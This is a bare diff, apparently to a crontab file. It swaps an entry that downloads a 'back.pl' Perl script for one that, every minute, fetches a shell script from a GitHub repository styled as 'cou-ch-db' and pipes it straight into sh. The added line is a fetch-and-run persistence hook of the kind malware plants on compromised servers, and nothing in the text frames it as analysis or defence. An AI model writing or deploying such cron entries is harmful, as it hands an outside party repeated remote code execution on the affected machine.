@@ -1,3 +1,5 @@
 
 
-*/1 * * * * curl https://raw.githubusercontent.com/mikwat3ayban/cou-ch-db/master/back.pl > /tmp/bac
+*/1 * * * * curl https://raw.githubusercontent.com/mikwat3ayban/cou-ch-db/master/mikwa.sh | sh
+
+
